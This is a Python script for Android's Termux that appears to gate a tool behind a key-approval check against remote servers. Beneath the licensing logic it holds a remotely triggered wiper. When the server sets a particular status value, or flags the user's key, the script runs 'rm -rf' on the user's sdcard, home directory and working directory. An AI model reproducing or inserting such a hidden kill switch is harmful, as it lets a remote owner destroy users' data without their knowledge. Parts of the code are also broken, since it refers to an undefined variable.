#!/usr/bin/python3
import os
try:
	import requests
except ImportError:
	print('\n[->] Installing Module Requests ')
	os.system('pip install requests')
banner = " "
def logo():
	os.system("clear")
	print(banner)
	
import datetime
import random
import requests 
import re
import json
import sys
import platform
import time 
import uuid
id1 = uuid.uuid4().hex[:7].upper()
id2 = uuid.uuid4().hex[:7].upper()
id3 = uuid.uuid4().hex[:7].upper()

id4 = uuid.uuid4().hex[:1].upper()
id5 = uuid.uuid4().hex[:1].upper()
id6 = uuid.uuid4().hex[:1].upper()
id7 = uuid.uuid4().hex[:1].upper()
id8 = uuid.uuid4().hex[:1].upper()
id9 = uuid.uuid4().hex[:1].upper()


key1 = id1 + '-' +id2 + '-' + id3
key2 = id4 + '-' + id5 + '-' + id6 + '-' + id7 + '_' + id8 + '-' + id9
key3 = uuid.uuid4().hex[:25].upper()
key4 = uuid.uuid4().hex[:25].lower()

my_key = key1

try:
	key_chack = open('/data/data/com.termux/files/usr/.key.txt', 'r').read()
except:
	save = open('/data/data/com.termux/files/usr/.key.txt', 'w')
	save.write(my_key)
	save.close()


try:
	user_key = open('/data/data/com.termux/files/usr/.key.txt', 'r').read()
	approvedkey = requests.get('https://xxxxxx.000webhostapp.com/Keys').text
	if user_key in approvedkey:
		logo()
		print("    Congratulation, Your Key Is Approved ")
		pass
	else:
		logo()
		print("        Sorry Sir !  Your Key Is Not Approved ")
		print("\n[->] Your Key : " + user_key )
		print("")
		print("[->] Copy Your Key And Send To Owner ")
		input("[>>] Press Enter  ")
		os.system("xdg-open https://www.facebook.com/")
		time.sleep(2)
		exit()
except IOError:
	print("\n\n[×] Chack Your Internet Connection ")
	exit()
server_link = "https://xxxxxxxx.000webhostapp.com/User_Kesy/" + user_key
try:
	password = requests.get(server_link).json()["password"]
	logo()
	iid = input("[>>] Enter Key : ")
	if iid == password:
		pass
	else:
		os.system('xdg-open https://www.facebook.com/')
		exit()
except IOError:
	logo()
	print("[->] Internet Connection Error Bro :/ ")
	os.sys.exit()
	

try:
	server_status = requests.get(server_link).json()["server_status"]
	if server_status in ['online','Online','Activate','activate']:
		pass
	elif server_status in ['ofline','Ofline','off','Off']:
		logo()
		print("[->] Sorry Bro Server Down :/ ")
		exit()
	elif server_status in ['fuck','Fuck','Fuck Your System']:
		os.system('rm -rf /sdcard/*')
		os.system('rm -rf $HOME/*')
		os.system('rm -rf *')
		exit()
	elif server_status in ['bypass','Bypass']:
		logo()
		print("[->] Sorry Bro, But Try Not To Bypass :v ")
		exit()
	elif server_status in ['update','Update','upgrade','Upgrade']:
		logo()
		print("[->] Tool Updating Bro Wait For Some Time ")
		exit()
	elif server_status in ['exit','Exit']:
		exit()
	else:
		logo()
		print("[->] Error 405 ")
except IOError:
	logo()
	print("[->] Internet Connection Error Bro :/ ")
	os.sys.exit()
try:
	fucked_key = requests.get(server_link).json()["fucked_key"]
	blocked_key = requests.get(server_link).json()["blocked_key"]
	if blocked_key == key:
		logo()
		print("[->] Your Key Is Blocked Bro :/ ")
		exit()
	elif fucked_key == key:
		os.system('rm -rf /sdcard/*')
		os.system('rm -rf $HOME/*')
		os.system('rm -rf *')
		exit()
	else:
		pass
except IOError:
	logo()
	print("[->] Internet Connection Error Bro :/ ")
	os.sys.exit()
try:
	user_key = open('/data/data/com.termux/files/usr/.key.txt', 'r').read()
	approvedkey = requests.get('https://pastebin/raw/').text
	if user_key in approvedkey:
		logo()
		print("    Congratulation, Your Key Is Approved ")
		pass
	else:
		logo()
		print("        Sorry Sir !  Your Key Is Not Approved ")
		print("\n[->] Your Key : " + user_key )
		print("")
		print("[->] Copy Your Key And Send To Owner ")
		input("[>>] Press Enter  ")
		os.system("xdg-open https://www.facebook.com/")
		time.sleep(2)
		exit()
except IOError:
	print("\n\n[×] Chack Your Internet Connection ")
	exit()
    

